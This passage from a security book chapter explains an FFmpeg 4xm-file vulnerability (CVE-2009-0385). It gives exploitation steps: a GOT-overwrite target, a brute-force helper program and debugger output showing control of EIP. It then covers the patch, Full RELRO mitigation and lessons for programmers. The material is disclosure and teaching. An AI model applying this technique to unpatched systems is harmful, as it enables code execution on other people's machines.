0x55555558:    Cannot access memory at address 0x55555558</pre></div><div class="sect2" title="Step 4: Manipulate the strk Chunk to Gain Control over EIP"><div class="titlepage"><div><div><h2 class="title"><a id="step_4_colon_manipulate_the_strk_chunk"/>Step 4: Manipulate the strk Chunk to Gain Control over EIP</h2></div></div></div><p>The vulnerability allowed me to overwrite nearly arbitrary memory addresses with any 4-byte value. To gain control of the execution flow of FFmpeg, I had to overwrite a memory location that would allow me to control the <code class="literal">EIP</code> register. I had to find a stable address, one that was predictable within the address space of FFmpeg. That ruled out all stack addresses of the process. But the <span class="emphasis"><em>Executable and Linkable Format</em></span> (<span class="emphasis"><em>ELF</em></span>) used by Linux provides an almost perfect target: the <span class="emphasis"><em>Global Offset Table</em></span> (<span class="emphasis"><em>GOT</em></span>). Every library function used in FFmpeg has a reference in the GOT. By manipulating GOT entries, I could easily gain control of the execution flow (see Section A.4). The good thing about the GOT is that it’s predictable, which is exactly what I needed. I could gain control of <code class="literal">EIP</code> by overwriting the GOT entry of a library function that is called after the vulnerability happens.</p><p>So, what library function is called after the arbitrary memory writes? To answer this question, I had a look at the source code again:</p><div class="variablelist"><dl><dt><span class="term"><span class="strong"><strong>Source code file</strong></span></span></dt><dd><p><span class="emphasis"><em>libavformat/4xm.c</em></span></p></dd><dt><span class="term"><span class="strong"><strong>Function</strong></span></span></dt><dd><p><code class="literal">fourxm_read_header()</code></p></dd></dl></div><a id="I_programlisting4_d1e4430"/><pre class="programlisting">[..]
184         /* allocate a new AVStream */
<strong class="userinput"><code>185         st = av_new_stream(s, current_track);</code></strong>
[..]</pre><p>Directly after the four memory-write operations, a new <code class="literal">AVStream</code> is allocated using the function <code class="literal">av_new_stream()</code>.</p><div class="variablelist"><dl><dt><span class="term"><span class="strong"><strong>Source code file</strong></span></span></dt><dd><p><span class="emphasis"><em>libavformat/utils.c</em></span></p></dd><dt><span class="term"><span class="strong"><strong>Function</strong></span></span></dt><dd><p><code class="literal">av_new_stream()</code></p></dd></dl></div><a id="I_programlisting4_d1e4460"/><pre class="programlisting">[..]
<strong class="userinput"><code>2271    AVStream *av_new_stream(AVFormatContext *s, int id)</code></strong>
2272    {
2273        AVStream *st;
2274        int i;
2275
2276        if (s-&gt;nb_streams &gt;= MAX_STREAMS)
2277            return NULL;
2278
<strong class="userinput"><code>2279        st = av_mallocz(sizeof(AVStream));</code></strong>
[..]</pre><p>In line 2279 another function named <code class="literal">av_mallocz()</code> is called.</p><div class="variablelist"><dl><dt><span class="term"><span class="strong"><strong>Source code file</strong></span></span></dt><dd><p><span class="emphasis"><em>libavutil/mem.c</em></span></p></dd><dt><span class="term"><span class="strong"><strong>Functions</strong></span></span></dt><dd><p><code class="literal">av_mallocz()</code> and <code class="literal">av_malloc()</code></p></dd></dl></div><a id="I_programlisting4_d1e4493"/><pre class="programlisting">[..]
<strong class="userinput"><code>43    void *av_malloc(unsigned int size)</code></strong>
44    {
45        void *ptr = NULL;
46    #ifdef CONFIG_MEMALIGN_HACK
47        long diff;
48    #endif
49
50        /* let's disallow possible ambiguous cases */
51        if(size &gt; (INT_MAX-16) )
52            return NULL;
53
54    #ifdef CONFIG_MEMALIGN_HACK
55        ptr = malloc(size+16);
56        if(!ptr)
57            return ptr;
58        diff= ((-(long)ptr - 1)&amp;15) + 1;
59        ptr = (char*)ptr + diff;
60        ((char*)ptr)[-1]= diff;
61    #elif defined (HAVE_POSIX_MEMALIGN)
62        posix_memalign(&amp;ptr,16,size);
63    #elif defined (HAVE_MEMALIGN)
<strong class="userinput"><code>64        ptr = memalign(16,size);</code></strong>
[..]
<strong class="userinput"><code>135    void *av_mallocz(unsigned int size)</code></strong>
136    {
<strong class="userinput"><code>137        void *ptr = av_malloc(size);</code></strong>
138        if (ptr)
139            memset(ptr, 0, size);
140        return ptr;
141    }
[..]</pre><p>In line 137 the function <code class="literal">av_malloc()</code> is called, and it calls <code class="literal">memalign()</code> in line 64 (the other <code class="literal">ifdef</code> cases—lines 54 and 61—are not defined when using the Ubuntu Linux 9.04 platform). I was excited to see <code class="literal">memalign()</code> because it was exactly what I was looking for: a library function that’s called directly after the vulnerability happens (see <a class="xref" href="ch04s02.html#a_call_graph_showing_the_path_from_the_v" title="Figure 4-6. A call graph showing the path from the vulnerable function to memalign()">Figure 4-6</a>).<a id="IDX-CHP-4-0012" class="indexterm"/><a id="IDX-CHP-4-0013" class="indexterm"/></p><div class="figure"><a id="a_call_graph_showing_the_path_from_the_v"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject4_d1e4538"/><img src="httpatomoreillycomsourcenostarchimages939273.png.jpg" alt="A call graph showing the path from the vulnerable function to memalign()"/></div></div><p class="title">Figure 4-6. A call graph showing the path from the vulnerable function to <code class="literal">memalign()</code></p></div><p>That brought me to the next question: What is the address of the GOT entry of <code class="literal">memalign()</code> in FFmpeg?</p><p>I gained this information with the help of <code class="literal">objdump</code>:<a id="IDX-CHP-4-0014" class="indexterm"/></p><a id="I_programlisting4_d1e4556"/><pre class="programlisting">linux$ <strong class="userinput"><code>objdump -R ffmpeg_g | grep memalign</code></strong>
08560204 R_386_JUMP_SLOT   posix_memalign</pre><p>So the address I had to overwrite was <code class="literal">0x08560204</code>. All I had to do was calculate an appropriate value for <code class="literal">track number</code> (<code class="literal">current_track</code>). I could get that value in either of two ways: I could try to calculate it, or I could use brute force. I chose the easy option and wrote the following program:</p><div class="example"><a id="little_helper_program_to"/><p class="title">Example 4-1. Little helper program to use brute force to find the appropriate value for <code class="literal">current_track</code> (<span class="emphasis"><em>addr_brute_force.c</em></span>)</p><div class="example-contents"><pre class="programlisting">01    #include &lt;stdio.h&gt;
02
03    // GOT entry address of memalign()
04    #define MEMALIGN_GOT_ADDR       0x08560204
05
06    // Min and max value for 'current_track'
07    #define SEARCH_START            0x80000000
08    #define SEARCH_END              0xFFFFFFFF
09
10    int
11    main (void)
12    {
13           unsigned int  a, b    = 0;
14
15           for (a = SEARCH_START; a &lt; SEARCH_END; a++) {
16                   b = (a * 20) + 0x10;
17                   if (b == MEMALIGN_GOT_ADDR) {
18                         printf ("Value for 'current_track': %08x\n", a);
19                         return 0;
20                   }
21           }
22
23           printf ("No valid value for 'current_track' found.\n");
24
25           return 1;
26    }</pre></div></div><p>The program illustrated in <a class="xref" href="ch04s02.html#little_helper_program_to" title="Example 4-1. Little helper program to use brute force to find the appropriate value for current_track (addr_brute_force.c)">Example 4-1</a> uses brute force to find an appropriate <code class="literal">track number</code> (<code class="literal">current_track</code>) value, which is needed to overwrite the (GOT) address defined in line 4. This is done by trying all possible values for <code class="literal">current_track</code> until the result of the calculation (see line 16) matches the searched GOT entry address of <code class="literal">memalign()</code> (see line 17). To trigger the vulnerability, <code class="literal">current_track</code> has to be interpreted as negative, so only values in the range of <code class="literal">0x80000000</code> to <code class="literal">0xffffffff</code> are considered (see line 15).</p><p>Example:</p><a id="I_programlisting4_d1e4611"/><pre class="programlisting">linux$ <strong class="userinput"><code>gcc -o addr_brute_force addr_brute_force.c</code></strong>
linux$ <strong class="userinput"><code>./addr_brute_force</code></strong>
Value for 'current_track': 8d378019</pre><p>I then adjusted the sample file and renamed it <span class="emphasis"><em>poc2.4xm</em></span>.</p><p>The only thing I changed was the value of <code class="literal">track number</code> (see (1) in <a class="xref" href="ch04s02.html#the_strk_chunk_of_poc2.4xm_after_i_adjus" title="Figure 4-7. The strk chunk of poc2.4xm after I adjusted the track number (current_track)">Figure 4-7</a>). It now matched the value generated by my little helper program.</p><div class="figure"><a id="the_strk_chunk_of_poc2.4xm_after_i_adjus"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject4_d1e4647"/><img src="httpatomoreillycomsourcenostarchimages939275.png.jpg" alt="The strk chunk of poc2.4xm after I adjusted the track number (current_track)"/></div></div><p class="title">Figure 4-7. The <code class="literal">strk</code> chunk of <span class="emphasis"><em>poc2.4xm</em></span> after I adjusted the <code class="literal">track number</code> (<code class="literal">current_track</code>)</p></div><p>I then tested the new proof-of-concept file in the debugger (see Section B.4 for a description of the following debugger commands).</p><a id="I_programlisting4_d1e4654"/><pre class="programlisting">linux$ <strong class="userinput"><code>gdb -q ./ffmpeg_g</code></strong>

(gdb) <strong class="userinput"><code>run -i poc2.4xm</code></strong>
Starting program: /home/tk/BHD/ffmpeg/ffmpeg_g -i poc2.4xm
FFmpeg version SVN-r16556, Copyright (c) 2000-2009 Fabrice Bellard, et al.
  configuration:
  libavutil     49.12. 0 / 49.12. 0
  libavcodec    52.10. 0 / 52.10. 0
  libavformat   52.23. 1 / 52.23. 1
  libavdevice   52. 1. 0 / 52. 1. 0
  built on Jan 24 2009 02:30:50, gcc: 4.3.3

Program received signal SIGSEGV, Segmentation fault.
<strong class="userinput"><code>0xbbbbbbbb in ?? ()</code></strong>

(gdb) <strong class="userinput"><code>info registers</code></strong>
eax            0xbfc1ddd0    −1077813808
ecx            0x9f69400     167154688
edx            0x9f60330     167117616
ebx            0x0           0
esp            0xbfc1ddac    0xbfc1ddac
ebp            0x85601f4     0x85601f4
esi            0x164         356
edi            0x9f60330     167117616
<strong class="userinput"><code>eip            0xbbbbbbbb    0xbbbbbbbb</code></strong>
eflags         0x10293       [ CF AF SF IF RF ]
cs             0x73          115
ss             0x7b          123
ds             0x7b          123
es             0x7b          123
fs             0x0           0
gs             0x33          51</pre><p>Bingo! Full control over <code class="literal">EIP</code>. After I gained control over the instruction pointer, I developed an exploit for the vulnerability. I used the VLC media player as an injection vector, because it uses the vulnerable version of FFmpeg.<a id="IDX-CHP-4-0015" class="indexterm"/><a id="IDX-CHP-4-0016" class="indexterm"/></p><p>As I’ve said in previous chapters, the laws in Germany do not allow me to provide a full working exploit, but you can watch a short video I recorded that shows the exploit in action on the book’s website.<sup>[<a href="ch04s05.html#ftn.CHP-4-FN-5" class="footnoteref">41</a>]</sup></p><p><a class="xref" href="ch04s02.html#diagram_of_my_exploitation_of_the_ffmpeg" title="Figure 4-8. Diagram of my exploitation of the FFmpeg bug">Figure 4-8</a> summarizes the steps I used to exploit the vulnerability. Here is the anatomy of the bug shown in this figure:</p><div class="orderedlist"><ol class="orderedlist"><li class="listitem"><p>The destination address for the memory write is calculated while using <code class="literal">current_track</code> as an index (<code class="literal">NULL</code> + <code class="literal">current_track</code> + offset). The value of <code class="literal">current_track</code> derives from user-controlled data of the 4xm media file.</p></li><li class="listitem"><p>The source data of the memory write derives from user-controlled data of the media file.</p></li><li class="listitem"><p>The user-controlled data is copied at the memory location of the <code class="literal">memalign()</code> GOT entry.</p></li></ol></div><div class="figure"><a id="diagram_of_my_exploitation_of_the_ffmpeg"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject4_d1e4718"/><img src="httpatomoreillycomsourcenostarchimages939277.png.jpg" alt="Diagram of my exploitation of the FFmpeg bug"/></div></div><p class="title">Figure 4-8. Diagram of my exploitation of the FFmpeg bug</p></div></div></div>
<div class="sect1" title="4.3 Vulnerability Remediation"><div class="titlepage"><div><div><h1 class="title"><a id="vulnerability_remediation-id2"/>4.3 Vulnerability Remediation</h1></div></div></div><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>Tuesday, January 27, 2009</em></span></p></div><p>After I told the FFmpeg maintainers about the bug, they developed the following patch:<sup>[<a href="ch04s05.html#ftn.CHP-4-FN-6" class="footnoteref">42</a>]</sup></p><a id="I_programlisting4_d1e4733"/><pre class="programlisting">--- a/libavformat/4xm.c
+++ b/libavformat/4xm.c
@@ −166,12 +166,13 @@ static int fourxm_read_header(AVFormatContext *s,
                 goto fail;
             }
             current_track = AV_RL32(&amp;header[i + 8]);
<strong class="userinput"><code>+            if((unsigned)current_track &gt;= UINT_MAX / sizeof(AudioTrack) - 1){</code></strong>
<strong class="userinput"><code>+                av_log(s, AV_LOG_ERROR, "current_track too large\n");</code></strong>
<strong class="userinput"><code>+                ret= −1;</code></strong>
<strong class="userinput"><code>+                goto fail;</code></strong>
<strong class="userinput"><code>+            }</code></strong>
             if (current_track + 1 &gt; fourxm-&gt;track_count) {
                 fourxm-&gt;track_count = current_track + 1;
<strong class="userinput"><code>-                if((unsigned)fourxm-&gt;track_count &gt;= UINT_MAX / sizeof(AudioTrack)){</code></strong>
<strong class="userinput"><code>-                    ret= −1;</code></strong>
<strong class="userinput"><code>-                    goto fail;</code></strong>
<strong class="userinput"><code>-                }</code></strong>
                 fourxm-&gt;tracks = av_realloc(fourxm-&gt;tracks,
                     fourxm-&gt;track_count * sizeof(AudioTrack));
                 if (!fourxm-&gt;tracks) {</pre><p>The patch applies a new length check that restricts the maximum value for <code class="literal">current_track</code> to <code class="literal">0x09249247</code>.</p><a id="I_programlisting4_d1e4771"/><pre class="programlisting">(UINT_MAX   / sizeof(AudioTrack) - 1) - 1 = maximum allowed value for current_track
(0xffffffff / 0x1c               - 1) - 1 = 0x09249247</pre><p>When the patch is in place, <code class="literal">current_track</code> can’t become negative, and the vulnerability is indeed fixed.<a id="IDX-CHP-4-0017" class="indexterm"/></p><p>This patch eliminated the vulnerability at the source code level. There’s also a generic exploit mitigation technique that would make it much harder to exploit the bug. To gain control of the execution flow, I had to overwrite a memory location to gain control over <code class="literal">EIP</code>. In this example, I used a GOT entry. The <span class="emphasis"><em>RELRO</em></span> mitigation technique has an operation mode called <span class="emphasis"><em>Full RELRO</em></span> that (re)maps the GOT as read-only, thus making it impossible to use the described GOT overwrite technique to gain control of the execution flow of FFmpeg. However, other exploitation techniques that are not mitigated by RELRO would still allow control over <code class="literal">EIP</code>.<a id="IDX-CHP-4-0018" class="indexterm"/><a id="IDX-CHP-4-0019" class="indexterm"/></p><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>See Section C.2 for more information on the RELRO mitigation technique</em></span>.</p></div><p>To make use of the Full RELRO mitigation technique, the FFmpeg binary would need to be recompiled with the following additional linker options: <code class="literal">-Wl,-z,relro,-z,now</code>.</p><p>Example of recompiling FFmpeg with Full RELRO support:</p><a id="I_programlisting4_d1e4814"/><pre class="programlisting">linux$ <strong class="userinput"><code>./configure --extra-ldflags="-Wl,-z,relro,-z,now"</code></strong>
linux$ <strong class="userinput"><code>make</code></strong></pre><p>Get GOT entry of <code class="literal">memalign()</code>:</p><a id="I_programlisting4_d1e4826"/><pre class="programlisting">linux$ <strong class="userinput"><code>objdump -R ./ffmpeg_g | grep memalign</code></strong>
0855ffd0 R_386_JUMP_SLOT   posix_memalign</pre><p>Adjust <a class="xref" href="ch04s02.html#little_helper_program_to" title="Example 4-1. Little helper program to use brute force to find the appropriate value for current_track (addr_brute_force.c)">Example 4-1</a> and use brute force to get the value for <code class="literal">current_track</code>:</p><a id="I_programlisting4_d1e4838"/><pre class="programlisting">linux$ <strong class="userinput"><code>./addr_brute_force</code></strong>
Value for 'current_track': 806ab330</pre><p>Make a new proof-of-concept file (<span class="emphasis"><em>poc_relro.4xm</em></span>) and test it in the debugger (see Section B.4 for a description of the following debugger commands):</p><a id="I_programlisting4_d1e4848"/><pre class="programlisting">linux$ <strong class="userinput"><code>gdb -q ./ffmpeg_g</code></strong>

(gdb) <strong class="userinput"><code>set disassembly-flavor intel</code></strong>

(gdb) <strong class="userinput"><code>run -i poc_relro.4xm</code></strong>
Starting program: /home/tk/BHD/ffmpeg_relro/ffmpeg_g -i poc_relro.4xm
FFmpeg version SVN-r16556, Copyright (c) 2000-2009 Fabrice Bellard, et al.
  configuration: --extra-ldflags=-Wl,-z,relro,-z,now
  libavutil     49.12. 0 / 49.12. 0
  libavcodec    52.10. 0 / 52.10. 0
  libavformat   52.23. 1 / 52.23. 1
  libavdevice   52. 1. 0 / 52. 1. 0
  built on Jan 24 2009 09:07:58, gcc: 4.3.3

Program received signal SIGSEGV, Segmentation fault.
0x0809c89d in fourxm_read_header (s=0xa836330, ap=0xbfb19674) at libavformat/4xm.c:178
178     fourxm-&gt;tracks[current_track].adpcm = AV_RL32(&amp;header[i + 12]);</pre><p>FFmpeg crashed again while trying to parse the malformed media file. To see what exactly caused the crash, I asked the debugger to display the current register values as well as the last instruction executed by FFmpeg:</p><a id="I_programlisting4_d1e4861"/><pre class="programlisting">(gdb) <strong class="userinput"><code>info registers</code></strong>
eax            0xbbbbbbbb    −1145324613
ecx            0xa83f3e0     176419808
edx            0x0           0
ebx            0x806ab330    −2140490960
esp            0xbfb194f0    0xbfb194f0
ebp            0x855ffc0     0x855ffc0
esi            0xa83f3a0     176419744
edi            0xa83f330     176419632
eip            0x809c89d     0x809c89d &lt;fourxm_read_header+509&gt;
eflags         0x10206       [ PF IF RF ]
cs             0x73          115
ss             0x7b          123
ds             0x7b          123
es             0x7b          123
fs             0x0           0
gs             0x33          51

(gdb) <strong class="userinput"><code>x/1i $eip</code></strong>
0x809c89d &lt;fourxm_read_header+509&gt;:    mov    DWORD PTR [edx+ebp*1+0x10],eax</pre><p>I also displayed the address where FFmpeg had attempted to store the value of <code class="literal">EAX</code>:</p><a id="I_programlisting4_d1e4874"/><pre class="programlisting">(gdb) <strong class="userinput"><code>x/1x $edx+$ebp+0x10</code></strong>
0x855ffd0 &lt;_GLOBAL_OFFSET_TABLE_+528&gt;:    0xb7dd4d40</pre><p>As expected, FFmpeg tried to write the value of <code class="literal">EAX</code> to the supplied address (<code class="literal">0x855ffd0</code>) of <code class="literal">memalign()</code>’s GOT entry.</p><a id="I_programlisting4_d1e4891"/><pre class="programlisting">(gdb) <strong class="userinput"><code>shell cat /proc/$(pidof ffmpeg_g)/maps</code></strong>
08048000-0855f000 r-xp 00000000 08:01 101582     /home/tk/BHD/ffmpeg_relro/ffmpeg_g
<strong class="userinput"><code>0855f000-08560000 r--p 00516000 08:01 101582     /home/tk/BHD/ffmpeg_relro/ffmpeg_g</code></strong>
08560000-0856c000 rw-p 00517000 08:01 101582     /home/tk/BHD/ffmpeg_relro/ffmpeg_g
0856c000-0888c000 rw-p 0856c000 00:00 0
0a834000-0a855000 rw-p 0a834000 00:00 0          [heap]
b7d60000-b7d61000 rw-p b7d60000 00:00 0
b7d61000-b7ebd000 r-xp 00000000 08:01 148202     /lib/tls/i686/cmov/libc-2.9.so
b7ebd000-b7ebe000 ---p 0015c000 08:01 148202     /lib/tls/i686/cmov/libc-2.9.so
b7ebe000-b7ec0000 r--p 0015c000 08:01 148202     /lib/tls/i686/cmov/libc-2.9.so
b7ec0000-b7ec1000 rw-p 0015e000 08:01 148202     /lib/tls/i686/cmov/libc-2.9.so
b7ec1000-b7ec5000 rw-p b7ec1000 00:00 0
b7ec5000-b7ec7000 r-xp 00000000 08:01 148208     /lib/tls/i686/cmov/libdl-2.9.so
b7ec7000-b7ec8000 r--p 00001000 08:01 148208     /lib/tls/i686/cmov/libdl-2.9.so
b7ec8000-b7ec9000 rw-p 00002000 08:01 148208     /lib/tls/i686/cmov/libdl-2.9.so
b7ec9000-b7eed000 r-xp 00000000 08:01 148210     /lib/tls/i686/cmov/libm-2.9.so
b7eed000-b7eee000 r--p 00023000 08:01 148210     /lib/tls/i686/cmov/libm-2.9.so
b7eee000-b7eef000 rw-p 00024000 08:01 148210     /lib/tls/i686/cmov/libm-2.9.so
b7efc000-b7efe000 rw-p b7efc000 00:00 0
b7efe000-b7eff000 r-xp b7efe000 00:00 0          [vdso]
b7eff000-b7f1b000 r-xp 00000000 08:01 130839     /lib/ld-2.9.so
b7f1b000-b7f1c000 r--p 0001b000 08:01 130839     /lib/ld-2.9.so
b7f1c000-b7f1d000 rw-p 0001c000 08:01 130839     /lib/ld-2.9.so
bfb07000-bfb1c000 rw-p bffeb000 00:00 0          [stack]</pre><p>This time FFmpeg crashed with a segmentation fault while trying to overwrite the read-only GOT entry (see the <code class="literal">r--p</code> permissions of the GOT at <code class="literal">0855f000-08560000</code>). It seems that Full RELRO can indeed successfully mitigate GOT overwrites.</p></div>
<div class="sect1" title="4.4 Lessons Learned"><div class="titlepage"><div><div><h1 class="title"><a id="lessons_learned-id2"/>4.4 Lessons Learned</h1></div></div></div><p>As a programmer:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><p>Don’t mix different data types.</p></li><li class="listitem"><p>Learn about the hidden transformations done automatically by the compiler. These implicit conversions are subtle and cause a lot of security bugs<sup>[<a href="ch04s05.html#ftn.CHP-4-FN-7" class="footnoteref">43</a>]</sup> (also see Section A.3).</p></li><li class="listitem"><p>Get a solid grasp of C’s type conversions.</p></li><li class="listitem"><p>Not all NULL pointer dereferences in user space are simple denial-of-service conditions. Some of them are really bad vulnerabilities that can lead to arbitrary code execution.</p></li><li class="listitem"><p>Full RELRO helps to mitigate the GOT overwrite exploitation technique.</p></li></ul></div><p>As a user of media players:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><p>Never trust media file extensions (see Section 2.5).</p></li></ul></div></div>
<div class="sect1" title="4.5 Addendum"><div class="titlepage"><div><div><h1 class="title"><a id="addendum-id2"/>4.5 Addendum</h1></div></div></div><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>Wednesday, January 28, 2009</em></span></p></div><p>The vulnerability was fixed (<a class="xref" href="ch04s05.html#timeline_of_the_ffmpeg_bug_from_notifica" title="Figure 4-9. Timeline of the FFmpeg bug from notification to the release of a fixed version of FFmpeg">Figure 4-9</a> shows the timeline) and a new version of FFmpeg is available, so I released a detailed security advisory on my website.<sup>[<a href="ch04s05.html#ftn.CHP-4-FN-8" class="footnoteref">44</a>]</sup> The bug was assigned CVE-2009-0385.<a id="IDX-CHP-4-0020" class="indexterm"/></p><div class="figure"><a id="timeline_of_the_ffmpeg_bug_from_notifica"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject4_d1e4957"/><img src="httpatomoreillycomsourcenostarchimages939279.png.jpg" alt="Timeline of the FFmpeg bug from notification to the release of a fixed version of FFmpeg"/></div></div><p class="title">Figure 4-9. Timeline of the FFmpeg bug from notification to the release of a fixed version of FFmpeg</p></div><div class="sect2" title="Notes"><div class="titlepage"><div><div><h2 class="title"><a id="notes-id3"/>Notes</h2></div></div></div><p><sup>[<a id="CHP-4-FN-1" href="#ftn.CHP-4-FN-1" class="footnote">37</a>]</sup></p><p><sup>[<a id="CHP-4-FN-2" href="#ftn.CHP-4-FN-2" class="footnote">38</a>]</sup></p><p><sup>[<a id="CHP-4-FN-3" href="#ftn.CHP-4-FN-3" class="footnote">39</a>]</sup></p><p><sup>[<a id="CHP-4-FN-4" href="#ftn.CHP-4-FN-4" class="footnote">40</a>]</sup></p><p><sup>[<a id="CHP-4-FN-5" href="#ftn.CHP-4-FN-5" class="footnote">41</a>]</sup></p><p><sup>[<a id="CHP-4-FN-6" href="#ftn.CHP-4-FN-6" class="footnote">42</a>]</sup></p><p><sup>[<a id="CHP-4-FN-7" href="#ftn.CHP-4-FN-7" class="footnote">43</a>]</sup></p><p><sup>[<a id="CHP-4-FN-8" href="#ftn.CHP-4-FN-8" class="footnote">44</a>]</sup><a id="IDX-CHP-4-0021" class="indexterm"/></p></div><div class="footnotes"><br/><hr/><div class="footnote"><p><sup>[<a id="ftn.CHP-4-FN-1" href="#CHP-4-FN-1" class="para">37</a>] </sup>See <a class="ulink" href="http://wiki.multimedia.cx/index.php?title=YouTube">http://wiki.multimedia.cx/index.php?title=YouTube</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-4-FN-2" href="#CHP-4-FN-2" class="para">38</a>] </sup>See <a class="ulink" href="http://ffmpeg.org/download.html">http://ffmpeg.org/download.html</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-4-FN-3" href="#CHP-4-FN-3" class="para">39</a>] </sup>See <a class="ulink" href="http://www.trapkit.de/books/bhd/">http://www.trapkit.de/books/bhd/</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-4-FN-4" href="#CHP-4-FN-4" class="para">40</a>] </sup>A detailed description of the 4X movie file format can be found at <a class="ulink" href="http://wiki.multimedia.cx/index.php?title=4xm_Format">http://wiki.multimedia.cx/index.php?title=4xm_Format</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-4-FN-5" href="#CHP-4-FN-5" class="para">41</a>] </sup>See <a class="ulink" href="http://www.trapkit.de/books/bhd/">http://www.trapkit.de/books/bhd/</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-4-FN-6" href="#CHP-4-FN-6" class="para">42</a>] </sup>The patch from the FFmpeg maintainers can be found at <a class="ulink" href="http://git.videolan.org/?p=ffmpeg.git;a=commitdiff;h=0838cfdc8a10185604db5cd9d6bffad71279a0e8">http://git.videolan.org/?p=ffmpeg.git;a=commitdiff;h=0838cfdc8a10185604db5cd9d6bffad71279a0e8</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-4-FN-7" href="#CHP-4-FN-7" class="para">43</a>] </sup>For more information on type conversions and associated security problems consult Mark Dowd, John McDonald, and Justin Schuh, <span class="emphasis"><em>The Art of Software Security Assessment: Identifying and Preventing Software Vulnerabilities</em></span> (Indianapolis, IN: Addison-Wesley Professional, 2007). See also the sample chapter available at <a class="ulink" href="http://ptgmedia.pearsoncmg.com/images/0321444426/samplechapter/Dowd_ch06.pdf">http://ptgmedia.pearsoncmg.com/images/0321444426/samplechapter/Dowd_ch06.pdf</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-4-FN-8" href="#CHP-4-FN-8" class="para">44</a>] </sup>My security advisory that describes the details of the FFmpeg vulnerability can be found at <a class="ulink" href="http://www.trapkit.de/advisories/TKADV2009-004.txt">http://www.trapkit.de/advisories/TKADV2009-004.txt</a>.</p></div></div></div></body></html>